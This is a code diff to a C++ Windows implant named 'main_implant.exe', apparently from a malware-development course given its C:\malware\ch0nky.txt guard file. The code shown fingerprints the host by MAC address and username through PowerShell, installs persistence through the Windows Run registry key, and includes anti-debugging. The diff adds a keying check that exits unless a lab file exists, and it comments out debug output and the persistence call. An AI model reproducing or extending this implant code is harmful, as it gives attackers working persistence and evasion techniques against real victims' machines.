@@ -1,5 +1,6 @@
 #include <iostream>
 #include <string>
+#include <shlwapi.h>
 #include "libs/nlohmann/json.hpp"
 #include "execution/execution.hpp"
 #include "crypto/aesgcm.hpp"
@@ -22,7 +23,7 @@ std::string get_mac_address(){
     std::string id;
     ss >> id;
     ss >> id;
-    std::cout << id << std::endl;
+    //std::cout << id << std::endl;
     return id;
 }
 
@@ -42,7 +43,7 @@ void make_persist(){
     std::string resp;
     res >> resp;
     resp = resp+ "\\main_implant.exe";
-    std::cout << resp << std::endl;
+    //std::cout << resp << std::endl;
     LPCSTR progPath = resp.c_str();
     HKEY hkey = NULL;
     LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
@@ -61,14 +62,24 @@ void check_debugger(){
             *ptr = 0;
         }
 }
+int check_ch0nky(){
+	char fileName[] = "C:\\malware\\ch0nky.txt"; // TODO: Make sure this file exists to perform this test
+    BOOL fileExists = FALSE;
+	fileExists = PathFileExistsA(fileName);
+    if(fileExists){
+        return 1;
+    }
+    exit(1);
+}
 int main(){
 //MessageBoxA(NULL,NULL,NULL,MB_YESNO);
 Sleep(100);
+check_ch0nky();
 std::string cmd_usr = "$env:UserName";
 LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
 std::string username = runPowershellCommand(username_cmd);
 std::cout << username << std::endl;
-make_persist();
+//make_persist();
 check_debugger();
 
 //exit(1);
@@ -80,7 +91,7 @@ check_debugger();
         
     // }
     json j = json::parse(info);
-    std::cout << j["systeminfo"] << std::endl;
+    //std::cout << j["systeminfo"] << std::endl;
 
     
     config.computer_guid = get_mac_address();
